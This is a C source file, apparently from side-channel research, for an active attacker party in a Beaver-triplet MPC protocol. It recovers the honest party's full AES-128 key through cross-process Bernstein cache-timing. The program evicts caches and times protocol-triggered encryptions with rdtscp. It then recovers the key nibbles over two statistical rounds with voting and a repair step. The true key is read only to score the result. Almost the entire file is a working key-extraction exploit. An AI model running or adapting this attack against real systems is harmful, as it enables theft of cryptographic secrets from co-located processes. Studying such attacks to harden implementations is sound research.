// attacker_tri_aes.c -- active Beaver-triplet party (P1) recovering the honest party's
// full AES-128 PRG key via cross-process Bernstein timing of the protocol-triggered PRG.
// Round-1 (top nibbles, voted) + round-2 (low nibbles, z-voting + early-bail + repair),
// all through the protocol shared state. Adapted from attacker_bern_full.c.
// Reuses the robust round-2 machinery from the self-attack: confound-subtraction,
// z-confidence voting, dead-window retry, and z-guided repair of a missed top nibble.
// The key is used ONLY to score the final guess (validation), never in recovery.
//
// Build: gcc -O2 -march=native attacker_bern_full.c -o attacker_bern_full -lrt -lm
// Run:   taskset -c 2 ./attacker_bern_full <N1> <N2> <MAXREPS2> <evictKB> <REPS1>  (diff core)
// Defaults: N1=25M N2=32M MAXREPS2=30 evict=4096KB REPS1=2
//   round-1 is now VOTED over REPS1 profiles (hardens the one-nibble straggler).
//   round-2 EARLY-BAILS: BERN_DEADBAIL consecutive dead windows abort it (def 6, "bad
//   window"), and BERN_LIVEBAIL live batches without convergence stop it for repair
//   (def 6, "round-1/lane issue") -- so a doomed key fails in minutes, not hours.
//   BERN_ZLIVE tunes the liveness threshold (def 12).
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <string.h>
#include <math.h>
#include <time.h>
#include <x86intrin.h>
#include "common_tri_aes.h"

static inline uint8_t bgfmul(uint8_t s,int c){return c==2?bxt(s):(c==3?(uint8_t)(bxt(s)^s):s);}

static size_t EVSZ=4*1024*1024; static uint8_t* evbuf; static volatile uint64_t esink;
static inline void evict(void){ for(size_t o=0;o<EVSZ;o+=64) esink^=evbuf[o]; }
static uint64_t rng=0x1234567; static inline uint32_t xr(){rng^=rng<<13;rng^=rng>>7;rng^=rng<<17;return (uint32_t)rng;}

static inline uint64_t trigger_timed(TriAesShared* st){
 unsigned a;_mm_lfence();uint64_t t0=__rdtscp(&a);_mm_lfence();
 st->trigger_prg=1; while(st->trigger_prg) _mm_pause();
 _mm_lfence();uint64_t t1=__rdtscp(&a);_mm_lfence();return t1-t0;
}
static uint64_t measure_min_rt(TriAesShared* st,int keysel,long K){
 st->keysel=(uint8_t)keysel; __sync_synchronize(); uint8_t in[16]; uint64_t mn=~0ULL;
 for(long i=0;i<K;i++){ for(int j=0;j<16;j++){in[j]=(uint8_t)xr();st->prg_in[j]=in[j];} evict(); uint64_t t=trigger_timed(st); if(t<mn)mn=t; } return mn; }

// ---- round-1 streaming profile (victim on key `keysel`) ----
static double g_sum[16][256],g_cnt[16][256];
static void collect_profile(TriAesShared* st,int keysel,long N,uint64_t cutoff,double out[16][256]){
 memset(g_sum,0,sizeof g_sum);memset(g_cnt,0,sizeof g_cnt); st->keysel=(uint8_t)keysel;__sync_synchronize(); uint8_t in[16];
 for(long n=0;n<N;n++){ for(int j=0;j<16;j++){in[j]=(uint8_t)xr();st->prg_in[j]=in[j];} evict(); uint64_t t=trigger_timed(st);
  if(cutoff&&t>cutoff)continue; for(int i=0;i<16;i++){g_sum[i][in[i]]+=t;g_cnt[i][in[i]]++;} }
 for(int b=0;b<16;b++){double m=0;int c=0;for(int v=0;v<256;v++)if(g_cnt[b][v]>0){m+=g_sum[b][v]/g_cnt[b][v];c++;}m/=c;
  for(int v=0;v<256;v++)out[b][v]=g_cnt[b][v]>0?(g_sum[b][v]/g_cnt[b][v]-m):0;} }

// ---- round-2 batch collection (victim on secret key) ----
static uint8_t *PT[16]; static uint16_t *TT; static long M;
static void collect_r2(TriAesShared* st,long N,uint64_t cutoff){ st->keysel=1;__sync_synchronize(); uint8_t in[16]; M=0;
 for(long n=0;n<N;n++){ for(int j=0;j<16;j++){in[j]=(uint8_t)xr();st->prg_in[j]=in[j];} evict(); uint64_t t=trigger_timed(st);
  if(cutoff&&t>cutoff)continue; for(int j=0;j<16;j++)PT[j][M]=in[j]; TT[M]=(uint16_t)(t>65535?65535:t); M++; } }

static const int LANE[4][4]={{0,5,10,15},{4,9,14,3},{8,13,2,7},{12,1,6,11}};
static const int COEF[4]={2,3,1,1};
static float *Rr; static double *Cs; static uint32_t *Cc; static double *A1s,*A1c;
#define CIDX(u,x,y) (((size_t)(u)<<16)|((size_t)(x)<<8)|(size_t)(y))
static void run_lane(int lane,const uint8_t ktop[4],int outlo[4],double*ov,double*oconf){
 const int*bi=LANE[lane]; const uint8_t *b0=PT[bi[0]],*b1=PT[bi[1]],*b2=PT[bi[2]],*b3=PT[bi[3]];
 memset(A1s,0,65536*sizeof(double));memset(A1c,0,65536*sizeof(double));
 for(long i=0;i<M;i++){int idx=(((b0[i]>>4)^ktop[0])<<12)|(((b1[i]>>4)^ktop[1])<<8)|(((b2[i]>>4)^ktop[2])<<4)|((b3[i]>>4)^ktop[3]);A1s[idx]+=TT[i];A1c[idx]++;}
 for(long i=0;i<M;i++){int idx=(((b0[i]>>4)^ktop[0])<<12)|(((b1[i]>>4)^ktop[1])<<8)|(((b2[i]>>4)^ktop[2])<<4)|((b3[i]>>4)^ktop[3]);Rr[i]=(float)(TT[i]-A1s[idx]/A1c[idx]);}
 static uint8_t term[4][16][256];
 for(int s=0;s<4;s++)for(int lo=0;lo<16;lo++)for(int p=0;p<256;p++)term[s][lo][p]=(uint8_t)(bgfmul(BSBOX[p^((ktop[s]<<4)|lo)],COEF[s])>>4);
 int ba=0,bb=0,bc=0,bd=0;double best=-1e300;double sumv=0,sumv2=0;long cntv=0;
 for(int a=0;a<16;a++)for(int b=0;b<16;b++){const uint8_t*A=term[0][a],*B=term[1][b];
   memset(Cs,0,(size_t)16*256*256*sizeof(double));memset(Cc,0,(size_t)16*256*256*sizeof(uint32_t));
   for(long i=0;i<M;i++){int u=A[b0[i]]^B[b1[i]];size_t id=CIDX(u,b2[i],b3[i]);Cs[id]+=Rr[i];Cc[id]++;}
   for(int c=0;c<16;c++)for(int d=0;d<16;d++){const uint8_t*C=term[2][c],*D=term[3][d];
     double sumL[16]={0};uint64_t cntL[16]={0};
     for(int u=0;u<16;u++)for(int x=0;x<256;x++){int ul=u^C[x];const double*rs=&Cs[CIDX(u,x,0)];const uint32_t*rc=&Cc[CIDX(u,x,0)];
       for(int y=0;y<256;y++){int L=ul^D[y];sumL[L]+=rs[y];cntL[L]+=rc[y];}}
     double mean[16],am=0;int cc=0;for(int L=0;L<16;L++)if(cntL[L]>0){mean[L]=sumL[L]/cntL[L];am+=mean[L];cc++;}
     am/=cc;double v=0;for(int L=0;L<16;L++)if(cntL[L]>0)v+=(mean[L]-am)*(mean[L]-am);v/=cc;
     sumv+=v;sumv2+=v*v;cntv++;
     if(v>best){best=v;ba=a;bb=b;bc=c;bd=d;}}}
 outlo[0]=ba;outlo[1]=bb;outlo[2]=bc;outlo[3]=bd;*ov=best;
 double mv=sumv/cntv;double var=sumv2/cntv-mv*mv;double sd=sqrt(var>1e-12?var:1e-12);*oconf=(best-mv)/sd;
}

int main(int argc,char**argv){
 long N1=(argc>1)?atol(argv[1]):(25L*1000*1000);
 long N2=(argc>2)?atol(argv[2]):(32L*1000*1000);
 int MAXR=(argc>3)?atoi(argv[3]):30;
 if(argc>4) EVSZ=(size_t)atol(argv[4])*1024;
 int REPS1=(argc>5)?atoi(argv[5]):2;              // round-1 voted profiles
 double ZLIVE=12.0; {const char*z=getenv("BERN_ZLIVE");if(z)ZLIVE=atof(z);}
 int DEAD_BAIL=6; {const char*e=getenv("BERN_DEADBAIL");if(e)DEAD_BAIL=atoi(e);}   // consecutive dead -> abort
 int LIVE_BAIL=6; {const char*e=getenv("BERN_LIVEBAIL");if(e)LIVE_BAIL=atoi(e);}   // live w/o converge -> repair

 int fd=shm_open(SHM_TRI_AES,O_RDWR,0666);
 if(fd==-1){perror("shm_open (run victim first)");return 1;}
 TriAesShared* st=mmap(NULL,sizeof(TriAesShared),PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
 if(st==MAP_FAILED){perror("mmap");return 1;}
 while(!st->p2_ready) _mm_pause();

 evbuf=aligned_alloc(4096,EVSZ);memset(evbuf,1,EVSZ); rng^=__rdtsc();
 for(int i=0;i<16;i++)PT[i]=malloc(N2); TT=malloc(N2*sizeof(uint16_t)); Rr=malloc(N2*sizeof(float));
 Cs=malloc((size_t)16*256*256*sizeof(double));Cc=malloc((size_t)16*256*256*sizeof(uint32_t));
 A1s=malloc(65536*sizeof(double));A1c=malloc(65536*sizeof(double));
 if(!TT||!Rr||!Cs||!Cc||!A1s||!A1c){printf("alloc failed\n");return 1;}

 uint64_t base=measure_min_rt(st,0,100000); uint64_t cutoff=base*2;
 printf("[attacker] N1=%ld N2=%ld MAXREPS2=%d evict=%zuKB REPS1=%d deadbail=%d livebail=%d rt_min=%llu cutoff=%llu\n",
        N1,N2,MAXR,EVSZ/1024,REPS1,DEAD_BAIL,LIVE_BAIL,(unsigned long long)base,(unsigned long long)cutoff); fflush(stdout);

 // ===== ROUND 1 =====
 static double dp[16][256],da[16][256];
 printf("[attacker] round-1 reference profile (known key) ...\n");fflush(stdout); collect_profile(st,0,N1,cutoff,dp);
 double nibsum[16][16]; memset(nibsum,0,sizeof nibsum);
 for(int r=0;r<REPS1;r++){
   printf("[attacker] round-1 attack profile %d/%d (secret key) ...\n",r+1,REPS1);fflush(stdout);
   collect_profile(st,1,N1,cutoff,da);
   for(int b=0;b<16;b++)for(int n=0;n<16;n++){double s=0;for(int lo=0;lo<16;lo++){int d=(n<<4)|lo;double c=0;for(int v=0;v<256;v++)c+=da[b][v]*dp[b][v^d];s+=c;}nibsum[b][n]+=s;}
 }
 uint8_t ktop[16]; uint8_t cand_top[16][3]; int topv=0;
 for(int b=0;b<16;b++){
   int used_[16]={0};
   for(int r=0;r<3;r++){int bn=-1;double bv=-1e300;for(int n=0;n<16;n++)if(!used_[n]&&nibsum[b][n]>bv){bv=nibsum[b][n];bn=n;}cand_top[b][r]=(uint8_t)bn;used_[bn]=1;}
   ktop[b]=cand_top[b][0]; if(ktop[b]==(st->true_key[b]>>4))topv++;
 }
 printf("[attacker] ROUND-1 (voted over %d) top = %d/16\n",REPS1,topv); fflush(stdout);

 // ===== ROUND 2 (dead-window retry + z-voting), victim on secret key =====
 uint64_t ms[7]; for(int i=0;i<7;i++)ms[i]=measure_min_rt(st,1,40000);
 for(int i=0;i<7;i++)for(int j=i+1;j<7;j++)if(ms[j]<ms[i]){uint64_t t=ms[i];ms[i]=ms[j];ms[j]=t;}
 uint64_t cutoff2=ms[3]*2;
 double wlow[16][16]; memset(wlow,0,sizeof wlow);
 int prev[16]; for(int b=0;b<16;b++)prev[b]=-1; int stable=0,live=0,dead=0,total=0,consec_dead=0;
 uint8_t klow[16]; for(int b=0;b<16;b++)klow[b]=0;
 while(total<MAXR){
   collect_r2(st,N2,cutoff2); total++;
   int rok=0; double lz[4]; int lo_all[4][4]; double maxz=0;
   for(int lane=0;lane<4;lane++){const int*bi=LANE[lane];uint8_t kt[4];for(int s=0;s<4;s++)kt[s]=ktop[bi[s]];
     double v,conf;run_lane(lane,kt,lo_all[lane],&v,&conf);lz[lane]=conf;if(conf>maxz)maxz=conf;
     for(int s=0;s<4;s++){int n=lo_all[lane][s]&0xf; if(n==(st->true_key[bi[s]]&0xf))rok++;} }
   if(maxz<ZLIVE){ dead++; consec_dead++;
     printf("  r2 batch %2d: DEAD z=[%.0f %.0f %.0f %.0f] maxz=%.0f -> retry\n",total,lz[0],lz[1],lz[2],lz[3],maxz);fflush(stdout);
     if(consec_dead>=DEAD_BAIL){ printf("  [attacker] %d consecutive DEAD -> bad window, aborting round-2 early\n",consec_dead);fflush(stdout); break; }
     continue; }
   consec_dead=0;
   for(int lane=0;lane<4;lane++){const int*bi=LANE[lane];double w=(lz[lane]>0)?lz[lane]*lz[lane]:0;
     for(int s=0;s<4;s++){int bb=bi[s],n=lo_all[lane][s]&0xf;wlow[bb][n]+=w;} }
   live++;
   for(int b=0;b<16;b++){int bn=0;double bv=-1;for(int n=0;n<16;n++)if(wlow[b][n]>bv){bv=wlow[b][n];bn=n;}klow[b]=(uint8_t)bn;}
   int votok=0;for(int b=0;b<16;b++)if(klow[b]==(st->true_key[b]&0xf))votok++;
   int changed=0;for(int b=0;b<16;b++)if(klow[b]!=prev[b])changed=1; stable=changed?0:(stable+1);
   for(int b=0;b<16;b++)prev[b]=klow[b];
   printf("  r2 batch %2d: LIVE low %2d/16 z=[%.0f %.0f %.0f %.0f] voted %2d/16 stable=%d (live=%d)\n",
          total,rok,lz[0],lz[1],lz[2],lz[3],votok,stable,live); fflush(stdout);
   if(stable>=3&&live>=4) break;
   if(live>=LIVE_BAIL && stable<3){ printf("  [attacker] %d live batches without convergence -> round-1/lane issue, stopping for repair\n",live);fflush(stdout); break; }
 }
 { int lv=0; for(int b=0;b<16;b++) if(klow[b]==(st->true_key[b]&0xf))lv++;
   printf("[attacker] round-2: %d live / %d dead / %d total ; low %d/16\n",live,dead,total,lv); fflush(stdout); }

 // ===== z-guided repair of a missed top nibble =====
 { double lz[4]; int lo_tmp[4][4]; int tries=0; double maxz=0;
   do{ collect_r2(st,N2,cutoff2);
     for(int lane=0;lane<4;lane++){const int*bi=LANE[lane];uint8_t kt[4];for(int s=0;s<4;s++)kt[s]=ktop[bi[s]];double v;run_lane(lane,kt,lo_tmp[lane],&v,&lz[lane]);}
     maxz=0;for(int l=0;l<4;l++)if(lz[l]>maxz)maxz=lz[l]; tries++;
   }while(maxz<15.0&&tries<3);
   printf("  repair: per-lane z=[%.0f %.0f %.0f %.0f] (maxz=%.0f)\n",lz[0],lz[1],lz[2],lz[3],maxz);fflush(stdout);
   for(int lane=0;lane<4;lane++){ if(lz[lane]>=0.5*maxz)continue; const int*bi=LANE[lane];
     uint8_t base_kt[4];for(int s=0;s<4;s++)base_kt[s]=ktop[bi[s]];
     double best_z=lz[lane];uint8_t best_kt[4];int best_lo[4];for(int s=0;s<4;s++){best_kt[s]=base_kt[s];best_lo[s]=lo_tmp[lane][s];}
     int fb=-1,fn=-1;
     for(int s=0;s<4;s++)for(int rnk=1;rnk<3;rnk++){ uint8_t alt=cand_top[bi[s]][rnk]; if(alt==base_kt[s])continue;
       uint8_t kt[4];for(int t=0;t<4;t++)kt[t]=base_kt[t];kt[s]=alt; int lo[4];double v,z;run_lane(lane,kt,lo,&v,&z);
       if(z>best_z){best_z=z;for(int t=0;t<4;t++){best_kt[t]=kt[t];best_lo[t]=lo[t];}fb=bi[s];fn=alt;} }
     if(best_z>lz[lane]*1.5&&best_z>0.6*maxz&&fb>=0){ for(int s=0;s<4;s++){ktop[bi[s]]=best_kt[s];klow[bi[s]]=(uint8_t)(best_lo[s]&0xf);}
       printf("  repair: lane %d FIXED byte %d top->0x%x (z %.0f -> %.0f)\n",lane,fb,fn,lz[lane],best_z);fflush(stdout);
     } else printf("  repair: lane %d no confident fix (best z %.0f)\n",lane,best_z); }
 }

 // ===== assemble + score (validation only) =====
 uint8_t rec[16]; int full=0; topv=0; int lowv=0;
 for(int b=0;b<16;b++){ rec[b]=(uint8_t)((ktop[b]<<4)|klow[b]);
   if(ktop[b]==(st->true_key[b]>>4))topv++; if(klow[b]==(st->true_key[b]&0xf))lowv++; if(rec[b]==st->true_key[b])full++; }
 printf("\n==== CROSS-PROCESS RESULT ====\n");
 printf("true : ");for(int b=0;b<16;b++)printf("%02x",st->true_key[b]);printf("\n");
 printf("recov: ");for(int b=0;b<16;b++)printf("%02x",rec[b]);printf("\n");
 printf("top %d/16  low %d/16  FULL %d/16  %s\n",topv,lowv,full, full==16?"*** FULL KEY RECOVERED (cross-process) ***":"");

 st->exit_flag=1; __sync_synchronize();
 munmap(st,sizeof(TriAesShared)); close(fd); return 0;
}
